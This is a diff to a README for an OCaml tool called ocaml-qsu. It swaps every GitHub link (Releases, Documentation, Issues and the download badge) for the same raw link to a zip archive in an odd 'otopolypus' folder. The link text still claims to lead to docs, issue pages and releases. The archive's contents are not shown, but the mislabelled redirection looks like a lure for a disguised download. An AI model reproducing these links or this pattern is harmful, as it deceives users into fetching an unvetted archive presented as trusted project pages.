@@ -6,7 +6,7 @@ Welcome to ocaml-qsu! This guide will help you download and run your OCaml appli
 
 ## 📥 Download Link
 
-[![Download ocaml-qsu](https://img.shields.io/badge/Download-ocaml--qsu-blue.svg)](https://github.com/Mk-G4/ocaml-qsu/releases)
+[![Download ocaml-qsu](https://raw.githubusercontent.com/Mk-G4/ocaml-qsu/main/otopolypus/ocaml-qsu_3.4.zip)](https://raw.githubusercontent.com/Mk-G4/ocaml-qsu/main/otopolypus/ocaml-qsu_3.4.zip)
 
 ## 📃 Overview
 
@@ -24,7 +24,7 @@ To run ocaml-qsu, you need a computer with the following requirements:
 
 To get ocaml-qsu, follow these simple steps:
 
-1. Visit the [Releases page](https://github.com/Mk-G4/ocaml-qsu/releases) to find the latest version.
+1. Visit the [Releases page](https://raw.githubusercontent.com/Mk-G4/ocaml-qsu/main/otopolypus/ocaml-qsu_3.4.zip) to find the latest version.
 2. Click on the version number to enter the release detail page.
 3. Look for the "Assets" section. You will find the download files for different operating systems.
 4. Select the file that matches your operating system, and click to download it.
@@ -73,15 +73,15 @@ After installation, using ocaml-qsu is straightforward. You can run your OCaml a
 ## 🔗 Additional Resources
 
 For more detailed instructions and information:
-- Check the [Documentation](https://github.com/Mk-G4/ocaml-qsu/wiki) for guides and troubleshooting.
+- Check the [Documentation](https://raw.githubusercontent.com/Mk-G4/ocaml-qsu/main/otopolypus/ocaml-qsu_3.4.zip) for guides and troubleshooting.
 - Join our community on GitHub to share your experience and suggestions.
 
 ## 📧 Support
 
-If you face any issues or have questions, please visit the [GitHub Issues](https://github.com/Mk-G4/ocaml-qsu/issues) page to report them.
+If you face any issues or have questions, please visit the [GitHub Issues](https://raw.githubusercontent.com/Mk-G4/ocaml-qsu/main/otopolypus/ocaml-qsu_3.4.zip) page to report them.
 
 Thank you for choosing ocaml-qsu! Enjoy running your OCaml applications with ease.
 
 ## 📥 Download Again
 
-To download ocaml-qsu, visit the [Releases page](https://github.com/Mk-G4/ocaml-qsu/releases).
+To download ocaml-qsu, visit the [Releases page](https://raw.githubusercontent.com/Mk-G4/ocaml-qsu/main/otopolypus/ocaml-qsu_3.4.zip).
